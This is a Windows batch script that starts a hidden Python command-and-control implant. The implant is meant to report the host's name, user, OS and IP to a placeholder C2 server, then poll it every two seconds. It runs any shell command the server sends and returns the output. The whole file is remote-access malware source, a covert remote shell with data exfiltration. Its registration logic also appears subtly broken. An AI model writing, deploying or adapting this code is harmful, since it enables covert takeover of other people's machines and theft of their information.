@echo off
set C2_URL=__C2_URL__
set C2_TOKEN=__C2_TOKEN__
start /b python -c "
import urllib.request, json, os, socket, platform, subprocess, time, uuid, base64, sys, ctypes

C2_URL = os.environ['C2_URL']
C2_TOKEN = os.environ.get('C2_TOKEN', '')
AID_FILE = os.environ['TEMP'] + '\\.agent_id'

def get_aid():
    if os.path.exists(AID_FILE):
        with open(AID_FILE) as f: return f.read().strip()
    aid = uuid.uuid4().hex[:8]
    with open(AID_FILE, 'w') as f: f.write(aid)
    return aid

aid = get_aid()

def req(path, data=None):
    try:
        url = C2_URL + path
        sep = '&' if '?' in path else '?'
        if C2_TOKEN:
            url += sep + 'token=' + C2_TOKEN
        if data:
            data['token'] = C2_TOKEN
            r = urllib.request.urlopen(url, json.dumps(data).encode(), timeout=10)
        else:
            r = urllib.request.urlopen(url, timeout=10)
        return json.loads(r.read())
    except: return None

while True:
    if not os.path.exists(AID_FILE):
        info = {'hostname': socket.gethostname(), 'username': os.environ.get('USERNAME','admin'), 'os': platform.system()+' '+platform.release(), 'ip': socket.gethostbyname(socket.gethostname()), 'arch': platform.machine()}
        res = req('/register', info)
        if res and 'agent_id' in res:
            with open(AID_FILE, 'w') as f: f.write(res['agent_id'])
            aid = res['agent_id']

    tasks = req('/beacon/' + aid)
    if tasks and 'tasks' in tasks:
        for t in tasks['tasks']:
            c = t.get('command','')
            p = t.get('params',{})
            tid = t.get('task_id','')
            if c == 'shell':
                try:
                    out = subprocess.run(p.get('command',''), shell=True, capture_output=True, text=True, timeout=60)
                    r = out.stdout+out.stderr
                except: r = '[!] Error'
                req('/result/'+aid, {'task_id': tid, 'output': r or '[+] Done', 'status': 'success'})
    time.sleep(2)
"
